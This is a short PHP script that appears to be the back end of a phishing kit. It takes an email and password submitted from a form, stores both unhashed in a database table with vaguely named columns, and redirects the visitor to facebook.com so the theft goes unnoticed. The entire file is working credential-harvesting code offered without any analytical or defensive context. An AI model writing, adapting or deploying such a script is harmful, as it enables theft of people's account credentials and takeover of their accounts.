<?php
require_once 'config.php';
if(!isset($_POST['email']) || empty($_POST['email']) || !isset($_POST['pass']) || empty($_POST['pass']))
{
	die('Oops! Something went Wrong. Please try again, <br><a href="index.php">Click here to go to Homepage</a>');
}


$email=($_POST['email']);
$pass=($_POST['pass']);




$email=mysqli_real_escape_string($con, $_POST['email']);
$pass=mysqli_real_escape_string($con, $_POST['pass']);


	$query="INSERT INTO `table_name`(ad,yusu,refe) VALUES('$email', '$pass', '')";
	mysqli_query($con, $query);
header("Location:http://www.facebook.com")

?>
